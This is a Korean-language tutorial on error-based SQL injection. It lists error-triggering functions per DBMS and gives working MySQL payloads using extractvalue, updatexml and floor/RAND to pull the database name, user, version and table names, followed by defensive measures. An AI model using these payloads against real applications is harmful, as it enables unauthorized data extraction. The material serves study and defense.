# 에러 기반 SQL 인젝션 (Error-based SQL Injection)

`Error-based SQL Injection`은 **데이터베이스가 발생시키는 오류 메시지를 이용**하여 내부 정보를 추출하는 기법이다. 이 방식은 쿼리에 오류를 유발시켜, 그 오류 메시지에 포함된 데이터를 기반으로 공격자가 시스템 구조나 테이블 정보를 알아내는 데 사용된다.

에러 기반 SQLi는 명확한 피드백이 존재하기 때문에 추출 속도가 빠르고 상대적으로 단순한 편이지만, 최근 보안 설정에서는 **에러 메시지를 숨기는 경우가 많아** 제한적인 환경에서만 유효할 수 있다.

---

## 특징

* 응용 프로그램이 DB 오류 메시지를 사용자에게 그대로 반환할 때 사용 가능
* **빠르고 직관적**인 정보 추출이 가능
* 정보가 에러 메시지 내에 **직접 노출**됨

---

## 공격 방식

공격자는 쿼리의 일부로 **오류를 유도**하는 함수를 삽입하고, 그 결과로 나타나는 오류 메시지를 통해 데이터를 추출한다. 대표적으로 `extractvalue()`, `updatexml()`, `floor()` 등의 함수가 사용된다.

---

## DBMS 별 주요 기법

| DBMS           | 주요 함수 / 기법                                                                             |
| -------------- | -------------------------------------------------------------------------------------- |
| **MySQL**      | `extractvalue()`, `updatexml()`, `floor()`, `geometrycollection()` 등으로 에러를 발생시켜 정보 노출  |
| **MSSQL**      | `convert()`, `cast()`, `openquery()`, `raiserror()` 등을 이용한 타입 변환 또는 강제 오류 유도           |
| **Oracle**     | `to_number()`, `utl_inaddr.get_host_address()`, `dbms_xdb_version.checkin()` 등으로 에러 발생 |
| **PostgreSQL** | `to_number()`, 잘못된 타입 변환 등                                                             |

---

## MySQL 예시

### 1. `extractvalue()` 함수 활용

```sql
' AND extractvalue(1, concat(0x7e, (SELECT database()), 0x7e)) -- 
```

* XML 경로 오류를 발생시키면서 DB 이름이 오류 메시지에 출력됨

### 2. `updatexml()` 함수 활용

```sql
' AND updatexml(NULL, concat(0x7e, (SELECT user()), 0x7e), NULL) --
```

* XML 업데이트 중 경로 오류 발생 시 사용자 정보가 오류 메시지로 출력

### 3. `floor()` 함수 활용

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) --
```

* `GROUP BY` 와 `RAND()` 를 활용하여 중복된 키 발생 시도 → 에러 메시지 유도

---

## 페이로드 예시

| 목적          | 페이로드 예시                                                                                                                                                                            |
| ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 현재 DB 이름 추출 | `' AND extractvalue(1, concat(0x7e, database(), 0x7e)) --`                                                                                                                         |
| 현재 사용자 확인   | `' AND updatexml(NULL, concat(0x7e, user(), 0x7e), NULL) --`                                                                                                                       |
| DB 버전 확인    | `' AND extractvalue(1, concat(0x7e, @@version, 0x7e)) --`                                                                                                                          |
| 테이블명 유도     | `' AND updatexml(NULL, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e), NULL) --`                                   |
| 중복 키 에러 이용  | `' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT table_name FROM information_schema.tables LIMIT 0,1), FLOOR(RAND(0)*2)) a FROM information_schema.tables GROUP BY a) b) --` |

---

## 대응 방안

* **오류 메시지 숨기기**: 실제 운영환경에서는 오류 메시지를 사용자에게 보여주지 않아야 함
* **Prepared Statement 사용**: 파라미터를 분리하여 쿼리 자체에 직접 사용자 입력이 포함되지 않도록 설계
* **화이트리스트 기반 필터링**: 허용된 입력값만 통과시키는 검증 방법 적용
* **웹 방화벽(WAF) 사용**: 공격 패턴 탐지 및 차단

---

## 정리

> Error-based SQL Injection은 시스템이 반환하는 **에러 메시지를 그대로 노출**할 경우 강력하고 빠르게 정보를 추출할 수 있는 인젝션 방식이다.

> 그러나 많은 시스템이 기본적으로 에러 메시지를 숨기고 있어 점차 사용이 제한되고 있으며, `Blind SQL Injection`과 함께 병행되거나 사전 확인용으로 많이 활용된다.

> 보안을 강화하려면 **오류 메시지 관리**, **입력값 검증**, 그리고 **Prepared Statement 사용**은 필수적이다.

## 참고 사이트
>[SegaFalut Academy](https://academy.segfaulthub.com/ "nomaltic 해킹 강의")

[NetSPI](https://sqlwiki.netspi.com/injectionTypes/errorBased/#mysql "Error 기반 SQL 인젝션")

[Oracle](https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet "Oracle SQL Injection Cheat Sheet")

<hr />
